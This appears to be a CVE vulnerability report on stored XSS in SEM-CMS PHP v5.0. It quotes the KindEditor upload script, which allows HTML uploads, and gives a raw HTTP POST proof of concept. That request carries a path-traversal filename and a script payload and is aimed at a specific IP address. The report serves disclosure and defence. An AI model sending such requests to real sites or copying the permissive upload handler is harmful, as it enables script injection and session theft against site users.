### Security Vulnerability Report for CVE Submission

#### 1. Stored XSS Vulnerability

**Download Link:** [SEM-CMS PHP v5.0](https://www.sem-cms.com/TradeCmsdown/php/semcms_php_5.0.zip)

```php
<?php
/**
 * KindEditor PHP
 *
 * This PHP script is a demonstration and should not be used directly in production projects.
 * If you decide to use this script, please carefully review the relevant security settings before use.
 */

require_once 'JSON.php';

$php_path = dirname(__FILE__) . '/';
$php_url = dirname($_SERVER['PHP_SELF']) . '/';

// File save directory path
$save_path = $php_path . '../../Images/attached/';
// File save directory URL
$save_url = $php_url . '../../Images/attached/';
// Allowed file extensions
$ext_arr = array(
	'image' => array('gif', 'jpg', 'jpeg', 'png', 'bmp'),
	'flash' => array('swf', 'flv'),
	'media' => array('swf', 'flv', 'mp3', 'wav', 'wma', 'wmv', 'mid', 'avi', 'mpg', 'asf', 'rm', 'rmvb'),
	'file' => array('doc', 'docx', 'xls', 'xlsx', 'ppt', 'htm', 'html', 'txt', 'zip', 'rar', 'gz', 'bz2'),
);
// Maximum file size
$max_size = 1000000;

$save_path = realpath($save_path) . '/';

// PHP upload failure
if (!empty($_FILES['imgFile']['error'])) {
	switch ($_FILES['imgFile']['error']) {
		case '1':
			$error = 'Exceeds the allowed size by php.ini.';
			break;
		case '2':
			$error = 'Exceeds the form allowed size.';
			break;
		case '3':
			$error = 'Only part of the image was uploaded.';
			break;
		case '4':
			$error = 'Please select an image.';
			break;
		case '6':
			$error = 'Temporary directory not found.';
			break;
		case '7':
			$error = 'Error writing file to disk.';
			break;
		case '8':
			$error = 'File upload stopped by extension.';
			break;
		case '999':
		default:
			$error = 'Unknown error.';
	}
	alert($error);
}

// When there is an uploaded file
if (empty($_FILES) === false) {
	// Original filename
	$file_name = $_FILES['imgFile']['name'];
	// Temporary server filename
	$tmp_name = $_FILES['imgFile']['tmp_name'];
	// File size
	$file_size = $_FILES['imgFile']['size'];
	// Check filename
	if (!$file_name) {
		alert("Please select a file.");
	}
	// Check directory
	if (@is_dir($save_path) === false) {
		alert("Upload directory does not exist.");
	}
	// Check directory write permissions
	if (@is_writable($save_path) === false) {
		alert("Upload directory does not have write permissions.");
	}
	// Check if file was uploaded
	if (@is_uploaded_file($tmp_name) === false) {
		alert("Upload failed.");
	}
	// Check file size
	if ($file_size > $max_size) {
		alert("Uploaded file size exceeds limit.");
	}
	// Check directory name
	$dir_name = empty($_GET['dir']) ? 'image' : trim($_GET['dir']);
	if (empty($ext_arr[$dir_name])) {
		alert("Invalid directory name.");
	}
	// Get file extension
	$temp_arr = explode(".", $file_name);
	$file_ext = array_pop($temp_arr);
	$file_ext = trim($file_ext);
	$file_ext = strtolower($file_ext);
	// Check extension
	if (in_array($file_ext, $ext_arr[$dir_name]) === false) {
		alert("Uploaded file extension is not allowed.\nOnly " . implode(",", $ext_arr[$dir_name]) . " formats are allowed.");
	}
	// Create directory
	if ($dir_name !== '') {
		$save_path .= $dir_name . "/";
		$save_url .= $dir_name . "/";
		if (!file_exists($save_path)) {
			mkdir($save_path);
		}
	}
	$ymd = date("Ymd");
	$save_path .= $ymd . "/";
	$save_url .= $ymd . "/";
	if (!file_exists($save_path)) {
		mkdir($save_path);
	}
	// New filename
	$new_file_name = date("YmdHis") . '_' . rand(10000, 99999) . '.' . $file_ext;
	// Move file
	$file_path = $save_path . $new_file_name;
	if (move_uploaded_file($tmp_name, $file_path) === false) {
		alert("Failed to move uploaded file.");
	}
	@chmod($file_path, 0644);
	$file_url = $save_url . $new_file_name;

	header('Content-type: text/html; charset=UTF-8');
	$json = new Services_JSON();
	echo $json->encode(array('error' => 0, 'url' => $file_url));
	exit;
}

function alert($msg) {
	header('Content-type: text/html; charset=UTF-8');
	$json = new Services_JSON();
	echo $json->encode(array('error' => 1, 'message' => $msg));
	exit;
}
```

**Attack Vector:**

```
POST //Edit/php/upload_json.php?dir=file HTTP/1.1
Host: 111.231.1.116:82
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUXoPLk1h1J5BweQB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Content-Length: 224

------WebKitFormBoundaryUXoPLk1h1J5BweQB
Content-Disposition: form-data; name="imgFile"; filename="../../test.html"
Content-Type: image/jpeg

ByPassWaf<script>alert(1)</script>
------WebKitFormBoundaryUXoPLk1h1J5BweQB--
```

![image](https://github.com/user-attachments/assets/3821c8a5-d5e4-4a26-8bab-b41147ca778a)


![image](https://github.com/user-attachments/assets/af0abf86-b856-494b-8d67-6d21c8c1036f)


---

### Summary

The provided code contains a stored Cross-Site Scripting (XSS) vulnerability due to insufficient input validation and sanitization. An attacker can exploit this vulnerability by uploading a malicious HTML file containing JavaScript code that gets executed when accessed by other users or administrators.

**Steps to Reproduce:**
1. Upload a file with a `.html` extension containing malicious JavaScript code.
2. The uploaded file is saved in the web-accessible directory.
3. Access the uploaded file through its URL, triggering the stored XSS attack.

**Impact:**
- Potential theft of user credentials.
- Session hijacking.
- Defacement of the website.
- Spread of malware.

**Recommendations:**
1. Implement proper input validation and sanitization for all user inputs.
2. Use a Content Security Policy (CSP) to mitigate XSS attacks.
3. Ensure files uploaded do not contain executable scripts.
4. Regularly audit and update your security practices to prevent similar vulnerabilities.
